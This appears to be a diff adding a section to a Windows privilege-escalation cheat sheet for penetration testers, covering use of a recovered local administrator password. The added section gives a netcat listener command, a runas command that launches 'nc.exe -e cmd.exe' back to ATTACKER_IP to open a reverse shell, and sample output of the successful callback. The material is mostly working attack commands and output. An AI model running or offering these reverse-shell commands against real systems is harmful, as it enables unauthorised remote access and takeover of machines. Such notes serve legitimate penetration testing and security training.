@@ -1,5 +1,42 @@
 # Windows Privilege Abuse
 
+## Recovered Local Admin Credentials
+
+If you recover a valid local administrator password from configs, application storage, or credential hunting, use `runas` from a real `cmd.exe` prompt to start a process as that user.
+
+Start a listener:
+
+```bash
+nc -nlvp 9001
+```
+
+From the target in `cmd.exe`:
+
+```cmd
+runas /user:Administrator "nc.exe -e cmd.exe ATTACKER_IP 9001"
+```
+
+Enter the recovered password when prompted:
+
+```text
+Enter the password for Administrator:
+Attempting to start nc.exe -e cmd.exe ATTACKER_IP 9001 as user "HOSTNAME\Administrator" ...
+```
+
+Successful callback:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET]
+Microsoft Windows [Version 10.0.19044.1645]
+C:\WINDOWS\system32>
+```
+
+Notes:
+
+- Run it from `cmd.exe`; this path may fail or behave differently from a PowerShell prompt.
+- This requires an interactive password prompt. If you cannot interact with the prompt, use another credentialed execution path such as SMB/WinRM tooling when available.
+- Confirm the spawned context with `whoami /all`.
+
 ## SeImpersonate / SeAssignPrimaryToken
 
 ### Overview
